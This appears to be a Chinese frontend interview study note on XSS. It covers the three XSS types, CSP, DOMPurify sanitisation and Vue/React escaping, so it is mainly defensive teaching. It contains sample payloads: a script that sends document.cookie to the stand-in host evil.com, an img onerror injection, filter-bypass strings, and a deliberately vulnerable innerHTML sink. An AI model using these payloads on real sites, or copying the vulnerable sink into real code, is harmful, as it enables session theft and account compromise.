---
title: XSS
description: XSS 跨站脚本攻击的类型、防御方案与项目实战
category: 安全
difficulty: 中级
frequency: ⭐⭐⭐⭐⭐
status: drafted
created: 2026-07-05
updated: 2026-07-05
reviewed: null
tags:
  - XSS
  - 反射型
  - 存储型
  - DOM型
  - CSP
---

# XSS

> ⭐⭐⭐⭐⭐｜难度：中级｜项目：★★★

**XSS（跨站脚本攻击）是注入恶意脚本的前端安全漏洞，分反射型（URL 参数回显）、存储型（数据库持久化）和 DOM 型（客户端 JS 拼接）三种，核心防御是输出编码 + CSP + HttpOnly Cookie。**

## 一句话总结

**XSS 是攻击者在页面注入恶意脚本的攻击手段，分反射型（URL 参数）、存储型（数据库）和 DOM 型（客户端 JS），核心防御是输出编码 + CSP。**

## 核心机制

### 三种 XSS 类型

```ts
// —— 反射型 XSS：攻击脚本在 URL 参数中，服务端直接回显，浏览器解析执行 ——
// 例：https://site.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
// 服务端返回：<p>搜索结果：<script>...</script></p> —— 未转义，脚本执行
// 特点：一次性，需诱导用户点击钓鱼链接，不持久化

// —— 存储型 XSS：脚本存入数据库，所有访问者都受影响，危害最大 ——
// 例：评论区提交 <script>steal()</script> 存入数据库，每个打开页面的用户都中招
// 特点：持久化，受害者范围广，可形成 XSS 蠕虫自动传播

// —— DOM 型 XSS：纯客户端，JS 读取 URL hash 等拼接到 innerHTML，不经过服务端 ——
// 例：https://site.com/#<img src=x onerror="alert(1)">
const hash = location.hash.slice(1)           // source：不可信的数据来源
document.getElementById("content").innerHTML = hash  // sink：危险的输出位置
// 特点：不经过服务端，WAF 无法防御，需要前端自己处理
```

### 防御方案矩阵

```ts
// 1. HTML 实体编码 —— 最基础的输出编码
function htmlEncode(str: string): string {
  const map: Record<string, string> = {
    "&": "&amp;", "<": "&lt;", ">": "&gt;",
    '"': "&quot;", "'": "&#x27;", "/": "&#x2F;",
  }
  return str.replace(/[&<>"'\/]/g, (c) => map[c] || c)
}
// 不同上下文不同编码：HTML 内容用 htmlEncode，属性值还需引号包裹
// <input value="${htmlEncode(input)}"> ✅   <input value=${input}> ❌

// 2. 安全的 DOM API —— textContent 替代 innerHTML（浏览器自动处理，不会解析 HTML）
// element.textContent = userInput   // 安全 ✅
// element.innerHTML = userInput     // 危险 ❌

// 3. CSP 响应头 —— 最后一道防线
// Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
// 含义：只允许同源脚本，禁止插件，防止 base 标签劫持相对路径

// 4. HttpOnly Cookie —— JS 无法读取 document.cookie
// Set-Cookie: sessionId=xxx; HttpOnly; Secure; SameSite=Strict

// 5. 输入校验白名单
// 用户名：/^[a-zA-Z0-9_]{3,20}$/   手机号：/^1[3-9]\d{9}$/
// URL：校验协议是否为 http/https，拒绝 javascript: 和 data: 协议
```

### Vue/React 的默认防护与危险入口

```ts
// Vue：{{ }} 模板插值默认 HTML 转义 → 安全
// <p>{{ userInput }}</p>   → < 变成 &lt;，不会执行

// Vue 危险入口：v-html 直接渲染原始 HTML
// <div v-html="userInput"></div>  —— 必须确保内容已经 DOMPurify 清洗过

// React：JSX 的 { } 默认转义 → 安全
// <p>{userInput}</p>

// React 危险入口：dangerouslySetInnerHTML（名字本身就是警告）
// <div dangerouslySetInnerHTML={{ __html: userInput }} />
```

## 深度拓展

### 追问点 1：CSP 详解

```ts
// 完整 CSP 配置示例
// Content-Security-Policy:
//   default-src 'self';                          // 所有资源类型默认同源
//   script-src 'self' 'nonce-r@nd0m';           // 脚本：同源 + nonce 随机数
//   style-src 'self' 'unsafe-inline';           // 样式：生产环境也建议 nonce
//   img-src 'self' https: data:;               // 图片
//   connect-src 'self' https://api.example.com; // fetch/XHR 目标
//   object-src 'none';                          // 禁用 Flash/Java（必须配）
//   base-uri 'self';                            // 防 base 标签劫持
//   report-uri /csp-violation                   // 违规报告端点

// nonce 机制：每次请求生成随机数，同时注入 CSP 头和 <script nonce="xxx">
// 攻击者无法预测 nonce，注入的 <script> 不匹配 nonce → 不执行
// hash 机制：计算合法内联脚本的 SHA-256，加入 CSP 白名单
```

### 追问点 2：富文本 XSS 处理

```ts
import DOMPurify from "dompurify"

// 白名单标签过滤 + DOMPurify 清洗，双重保险
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li", "img"],
  ALLOWED_ATTR: ["href", "src", "alt", "title"],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|ftp):|[^a-z]|[a-z+.-]+(?:[^a-z+.-:]|$))/i,
})

// 关键原则：两次清洗
// 1. 提交到后端前清洗（防存储型 XSS）
// 2. 渲染到页面前再清洗（防绕过存储层 + DOM 型 XSS）
```

### 追问点 3：DOM 型 XSS 的 sink 和 source

```ts
// Sink（危险输出）：innerHTML / outerHTML / document.write / eval / new Function
// setTimeout("alert(1)", 100)  ← 字符串参数等同 eval，也是 sink
// location.href = "javascript:..." ← 同样危险
// element.setAttribute("onclick", userInput)  ← 事件属性也是 sink

// Source（不可信输入）：location / location.hash / location.search
// document.referrer / document.cookie / postMessage data / WebSocket 数据

// 审计方法：从 source 追踪到 sink，检查中间是否有编码/过滤
// 危险模式：params.get("name") → innerHTML = `Hello, ${name}`  ← XSS!
```

## 项目实战

### 1. 富文本编辑器 XSS 过滤

```ts
// hooks/useSanitizedHtml.ts
import DOMPurify from "dompurify"
import { useMemo } from "react"

export function useSanitizedHtml(dirty: string) {
  return useMemo(() => DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ["b", "i", "p", "a", "img", "ul", "ol", "li", "br"],
    ALLOWED_ATTR: ["href", "src", "alt", "target"],
  }), [dirty])
}
// 使用：<div dangerouslySetInnerHTML={{ __html: sanitized }} />
// 即使清洗过，仍只在必要时才用 dangerouslySetInnerHTML
```

### 2. URL 参数渲染前编码

```ts
// 从 URL 取参数显示时，使用框架默认转义
// React JSX 的 { } 自动转义，安全：
function SearchResult() {
  const [searchParams] = useSearchParams()
  return <p>搜索结果：{searchParams.get("q")}</p>  // 自动转义 ✅
}
// Vue：<p>搜索结果：{{ $route.query.q }}</p>  // {{ }} 自动转义 ✅
// 如果必须用 v-html/innerHTML：先用 htmlEncode() 编码或用 DOMPurify 清洗
```

### 3. CSP 头配置

```ts
// 开发环境：Vite meta 标签
// <meta http-equiv="Content-Security-Policy"
//   content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'">

// 生产环境 Nginx：
// add_header Content-Security-Policy "default-src 'self'; script-src 'self'; "
//   "style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; "
//   "object-src 'none'; base-uri 'self';";

// 建议：先用 Report-Only 模式观察违规报告，确认无误后再强制启用
```

## 易错点

1. **以为 Vue 的 `{{ }}` 绝对安全** —— `{{ }}` 确实转义 HTML，但 `v-html` 直接渲染原始 HTML。一旦 `v-html` 渲染用户输入且未清洗，XSS 就成立了。
2. **用黑名单过滤标签** —— 攻击者总有办法绕过（`<scr<script>ipt>`、`<img onerror>`、`<svg/onload>` 等），必须用白名单。
3. **只在输入时过滤** —— 输出时也必须编码。数据可能来自多个入口（API、WebSocket、URL 参数），输入过滤不一定覆盖所有路径。
4. **CSP 只配 `script-src`** —— 还需配 `style-src` 防 CSS 注入、`object-src 'none'` 禁用插件、`base-uri` 防 base 劫持。
5. **认为 HttpOnly Cookie 能挡住所有 XSS** —— 攻击者不必窃取 Cookie，可以原地发送请求（fetch 自动带 Cookie），直接操作 DOM 诱导用户。

## 相关阅读

- [CSRF](./csrf.md)
- [Token 存储安全](./token-storage.md)
- [网络/CORS](../网络/cors.md)
- [浏览器/渲染进程](../浏览器/render-process.md)
- [安全 知识地图](./index.md)

## 更新记录

- 2026-07-05：Phase 2 深度填充（三种 XSS 详解 + 防御矩阵 + CSP 深入 + 富文本处理 + 项目实战）
